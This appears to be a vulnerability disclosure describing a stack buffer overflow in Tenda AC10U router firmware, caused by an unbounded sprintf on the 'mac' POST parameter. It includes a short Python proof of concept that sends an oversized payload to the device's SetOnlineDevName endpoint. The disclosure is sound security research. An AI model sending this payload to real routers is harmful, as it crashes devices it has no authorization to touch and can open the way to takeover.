## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.49 has a stack overflow vulnerability located in the `formSetDeviceName` function. This function accepts the `mac` parameter from a POST request by `dev_id` variable and passes it to the `set_device_name` function. 

![image-20240307202242332](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307202242332.png)

Within `set_device_name`, the array `mib_name` is fixed at 128 bytes. However, since the user has control over the input of `mac`, the statement `sprintf(mib_name, "client.devicename%s", mac_addr);` leads to a buffer overflow. The user-supplied `mac` can exceed the capacity of the `mib_name` array, thus triggering this security vulnerability.

![image-20240313150525362](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313150525362.png)

![image-20240313150320528](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313150320528.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*1000

data = {"mac": payload,"devName": 1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240307202532447](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307202532447.png)